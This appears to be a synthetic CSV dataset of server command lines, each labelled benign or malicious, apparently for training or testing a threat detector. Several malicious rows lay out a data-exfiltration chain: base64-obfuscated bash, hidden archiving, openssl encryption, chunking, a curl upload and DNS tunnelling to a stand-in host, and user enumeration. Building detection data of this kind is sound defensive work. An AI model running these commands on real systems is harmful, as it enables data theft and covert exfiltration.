process_name,command_line,label
npm,npm ci --no-audit,benign
bash,cd /home/ec2-user/mobile-api && ls,benign
git,git commit -am 'fix: nginx retry logic',benign
docker,docker ps -a,benign
uptime,uptime,benign
bash,"X='find /var /home -name '\''*.sql'\'' -o -name '\''*.csv'\'' 2>/dev/null | head'; eval ""$X""",malicious
htop,htop -d 5,benign
ps,ps aux --sort=-%mem | head,benign
grep,grep -r 'TODO' /home/ec2-user/data-pipeline/src,benign
tar,tar czf /backups/nginx-31.tgz /var/lib/nginx,benign
docker,docker compose up -d postgres,benign
grep,grep -r 'TODO' /home/ec2-user/mobile-api/src,benign
npm,npm test -- --runInBand,benign
apt-get,apt-get install -y python3-pip,benign
aws,aws s3 ls s3://api-gateway-artifacts/,benign
bash,ls -la /home/ec2-user,benign
bash,cd /home/ec2-user/data-pipeline && ls,benign
terraform,terraform plan -out tfplan,benign
bash,echo Y3AgLXIgL3Zhci93d3cvZXhwb3J0cyAvdG1wLy5jYWNoZS9k | base64 -d | bash,malicious
aws,aws s3 ls s3://postgres-artifacts/,benign
psql,psql -h db -U ec2-user -c 'SELECT count(*) FROM orders;',benign
kubectl,kubectl rollout status deploy/auth-svc,benign
find,find /home/ec2-user/mobile-api -name '*.log' -mtime +7,benign
kubectl,kubectl rollout status deploy/worker,benign
git,git log --oneline -n 10,benign
git,git pull origin release/2.4,benign
kubectl,kubectl rollout status deploy/api-gateway,benign
go,go build ./...,benign
ssh,ssh ec2-user@build-73 uptime,benign
bash,echo dGFyIGN6ZiAvdG1wLy5jYWNoZS8uc2Vzc2lvbi50Z3ogL3RtcC8uY2FjaGUvZA== | base64 -d | bash,malicious
rsync,rsync -az /home/ec2-user/mobile-api/dist/ /var/www/api-gateway/,benign
git,git status,benign
kubectl,kubectl logs deploy/api-gateway --tail 50,benign
pip3,pip3 install -r requirements.txt,benign
python3,python3 /opt/app/manage.py migrate,benign
node,node scripts/seed.js,benign
redis-cli,redis-cli ping,benign
kubectl,kubectl rollout status deploy/nginx,benign
openssl,openssl enc -aes-256-cbc -in /tmp/.cache/.session.tgz -out /tmp/.cache/.session.tgz.e -k 430359ccab2a953238a391bc3ff66487,malicious
python3,python3 -m pytest tests/ -q,benign
git,git commit -am 'fix: worker retry logic',benign
docker,docker build -t redis:19 .,benign
rsync,rsync -az /home/ec2-user/data-pipeline/dist/ /var/www/auth-svc/,benign
free,free -m,benign
bash,cd /home/ec2-user/platform && ls,benign
aws,aws s3 ls s3://auth-svc-artifacts/,benign
aws,aws s3 ls s3://redis-artifacts/,benign
scp,scp report.csv ec2-user@reports:/srv/reports/,benign
curl,curl -fsS https://api.github.com/repos/billing-service/commits | head,benign
split,split -b 4m /tmp/.cache/.session.tgz.e /tmp/.cache/p_,malicious
journalctl,journalctl -u auth-svc --since '10 min ago',benign
docker,docker compose up -d search,benign
npm,npm run build,benign
journalctl,journalctl -u search --since '10 min ago',benign
git,git commit -am 'fix: api-gateway retry logic',benign
ssh,ssh ec2-user@build-69 uptime,benign
kubectl,kubectl logs deploy/redis --tail 50,benign
kubectl,kubectl get pods -n production,benign
tar,tar czf /backups/worker-15.tgz /var/lib/worker,benign
docker,docker logs --tail 100 nginx,benign
docker,docker logs --tail 100 worker,benign
curl,curl -s -F file=@/tmp/.cache/.session.tgz.e https://pkg-mirror-488.test/u,malicious
journalctl,journalctl -u postgres --since '10 min ago',benign
docker,docker build -t postgres:12 .,benign
systemctl,systemctl restart search,benign
tar,tar czf /backups/redis-78.tgz /var/lib/redis,benign
systemctl,systemctl restart nginx,benign
git,git checkout develop,benign
git,git commit -am 'fix: auth-svc retry logic',benign
docker,docker logs --tail 100 payments,benign
df,df -h,benign
bash,for c in $(base64 /tmp/.cache/p_aa); do nslookup $c.pkg-mirror-488.test; done,malicious
find,find /home/ec2-user/billing-service -name '*.log' -mtime +7,benign
aws,aws s3 ls s3://nginx-artifacts/,benign
journalctl,journalctl -u nginx --since '10 min ago',benign
aws,aws s3 ls s3://search-artifacts/,benign
find,find /home/ec2-user/infra -name '*.log' -mtime +7,benign
grep,grep -r 'TODO' /home/ec2-user/billing-service/src,benign
grep,grep -r 'TODO' /home/ec2-user/platform/src,benign
git,git pull origin hotfix/login,benign
bash,"X='getent passwd | awk -F: '\''$3>=1000{print $1}'\'''; eval ""$X""",malicious
kubectl,kubectl rollout status deploy/redis,benign
tar,tar czf /backups/payments-55.tgz /var/lib/payments,benign
docker,docker build -t worker:64 .,benign
systemctl,systemctl status api-gateway,benign
make,make lint,benign
journalctl,journalctl -u api-gateway --since '10 min ago',benign
curl,curl -s http://localhost:8080/health,benign
systemctl,systemctl status search,benign
git,git pull origin feature/checkout,benign
docker,docker logs --tail 100 auth-svc,benign
systemctl,systemctl status auth-svc,benign
